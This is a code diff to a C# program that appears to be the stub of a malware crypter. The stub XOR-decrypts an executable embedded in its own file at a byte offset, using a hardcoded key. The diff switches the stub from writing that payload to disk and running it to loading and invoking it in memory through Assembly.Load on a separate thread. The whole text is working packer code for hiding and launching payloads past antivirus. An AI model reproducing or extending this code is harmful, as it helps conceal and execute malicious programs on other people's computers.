@@ -12,7 +12,7 @@ namespace SomeAwesomeStub
 {
     public partial class StubTest : Form
     {
-        private int byteOffset = 11000;
+        private int byteOffset = 12000;
         // The secret key used to encrypt / decrypt the executive code. The stub and crypter key
         // both must have the same key for this to work.
         private byte[] secretKey = new byte[] { 0x10, 0x20, 0x92, 0x12, 0x29 };
@@ -22,11 +22,27 @@ namespace SomeAwesomeStub
             InitializeComponent();
         }
 
+        private void RunPayLoad(byte[] byteData)
+        {
+            // We are going to prepare the bytes for assembly
+            System.Reflection.Assembly a = System.Reflection.Assembly.Load(byteData);
+            // Find the entry point to the executable bytes
+            System.Reflection.MethodInfo method = a.EntryPoint;
+            if (method != null)
+            {
+                method.Invoke(a.CreateInstance(method.Name), null); // Invoke application (run it)
+                MessageBox.Show("Payload successfully executed.");
+            }
+            else
+            {
+                MessageBox.Show("Payload can not be executed.");
+            }
+        }
+
         private void BtnStubRun_Click(object sender, EventArgs e)
         {
             // Get the exe file path.
             string thisFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
-            string outputPath = System.IO.Path.GetDirectoryName(thisFilePath) + "\\output.com";
             // Load all of the bytes of the file into an byte array.
             byte[] thisFileBytes = System.IO.File.ReadAllBytes(thisFilePath);
             // How much bytes is in this exe
@@ -55,9 +71,9 @@ namespace SomeAwesomeStub
                         (byte)(thisFileBytes[byteOffset + i] ^ secretKey[i % secretKey.Length]);
                 }
 
-                // Write all of the bytes to an output file
-                System.IO.File.WriteAllBytes(outputPath, decryptedExecutable);
-                System.Diagnostics.Process.Start(outputPath); //Run the file
+                System.Threading.Thread myThread = 
+                    new System.Threading.Thread(() => RunPayLoad(decryptedExecutable));
+                myThread.Start();
             }
             else
             {
